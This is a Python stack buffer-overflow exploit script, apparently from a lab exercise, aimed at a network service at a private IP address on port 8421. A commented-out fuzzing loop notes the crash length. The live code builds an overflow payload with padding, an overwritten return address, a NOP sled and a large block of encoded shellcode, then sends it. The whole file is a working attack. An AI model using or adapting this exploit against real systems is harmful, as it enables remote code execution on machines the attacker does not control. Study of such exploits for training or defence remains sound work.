import socket as s
import time

sock = s.socket(s.AF_INET, s.SOCK_STREAM)

sock.connect(("192.168.100.128", 8421))
msg = sock.recv(2048)
print(msg.decode())

# for i in range(485, 540):
#     # Command is parsed into isASCII despite not being a valid command
#     payload = "A" * i + "CCC" + "BBBB"
#     print(f"Trying length {i + 7}")
#     time.sleep(0.1)
#     sock.send(payload.encode())
#     msg = sock.recv(2048)
#     print(msg.decode())
#     # Causes consistent crash @ length 513

buf =  b""
buf += b"\xba\x90\xf6\x87\xa8\xda\xd2\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x59\x31\x53\x14\x83\xeb\xfc\x03\x53"
buf += b"\x10\x72\x03\x7b\x40\xfd\xec\x84\x91\x61\x64\x61"
buf += b"\xa0\xb3\x12\xe1\x91\x03\x50\xa7\x19\xe8\x34\x5c"
buf += b"\x2d\x59\xf2\x7a\xba\xd7\x2b\xb2\x43\x26\xec\x18"
buf += b"\x87\x29\x90\x62\xd4\x89\xa9\xac\x29\xc8\xee\x7a"
buf += b"\x47\x25\xa2\x2b\x2c\xeb\x53\x5f\x70\x37\x55\x8f"
buf += b"\xfe\x07\x2d\xaa\xc1\xf3\x81\xb5\x11\xab\x92\xfe"
buf += b"\x89\xc0\xfd\xde\xa8\x05\x78\xd7\xdf\x95\xb2\x17"
buf += b"\x56\x6e\x80\x6c\x68\xa6\xd8\xb2\xaa\x89\x16\x9f"
buf += b"\x2c\xd2\x11\x3f\x5b\x28\x62\xc2\x5c\xeb\x18\x18"
buf += b"\xe8\xeb\xbb\xeb\x4a\xcf\x3a\x3f\x0c\x84\x31\xf4"
buf += b"\x5a\xc2\x55\x0b\x8e\x79\x61\x80\x31\xad\xe3\xd2"
buf += b"\x15\x69\xaf\x81\x34\x28\x15\x67\x48\x2a\xf1\xd8"
buf += b"\xec\x21\x10\x0e\x90\xca\xea\x2f\xcc\x5c\x26\xe2"
buf += b"\xef\x9c\x20\x75\x83\xae\xef\x2d\x0b\x82\x78\xe8"
buf += b"\xcc\x93\x6f\x0b\x02\x1b\xff\xf5\xa3\x5b\x29\x32"
buf += b"\xf7\x0b\x41\x93\x78\xc0\x91\x1c\xad\x7c\x98\x8a"
buf += b"\x8e\x28\xf8\xcf\x67\x2a\x01\xf6\xdd\xa3\xe7\xa6"
buf += b"\x71\xe3\xb7\x06\x22\x43\x68\xef\x28\x4c\x57\x0f"
buf += b"\x53\x87\xf0\xba\xbc\x71\xa8\x52\x24\xd8\x22\xc2"
buf += b"\xa9\xf7\x4e\xc4\x22\xfd\xaf\x8b\xc2\x74\xbc\xfc"
buf += b"\xb4\x76\x3c\xfd\x50\x76\x56\xf9\xf2\x21\xce\x03"
buf += b"\x22\x05\x51\xfb\x01\x16\x96\x03\xd4\x2e\xec\x32"
buf += b"\x42\x0e\x9a\x3a\x82\x8e\x5a\x6d\xc8\x8e\x32\xc9"
buf += b"\xa8\xdd\x27\x16\x65\x72\xf4\x83\x86\x22\xa8\x04"
buf += b"\xef\xc8\x97\x63\xb0\x33\xf2\xf7\xb7\xcb\x80\xdf"
buf += b"\x1f\xa3\x7a\x60\xa0\x33\x11\x60\xf0\x5b\xee\x4f"
buf += b"\xff\xab\x0f\x5a\xa8\xa3\x9a\x0b\x1a\x52\x9a\x01"
buf += b"\xfa\xca\x9b\xa6\x27\xfd\xe6\xc7\xd8\xfe\x16\xce"
buf += b"\xbc\xff\x16\xee\xc2\x3c\xc1\xd7\xb0\x03\xd1\x63"
buf += b"\xca\x36\x74\xc5\x41\x38\x2a\x15\x40"

i = 513
payload = b"A" * i + b"CCC" + b"\xE4\xC3\x63\x77" + b"\x90" * 8 + buf
print(f"Trying length {i + 7}")
time.sleep(0.1)
sock.send(payload)
msg = sock.recv(2048)
print(msg.decode())
# 42424242 in eip @ length 520
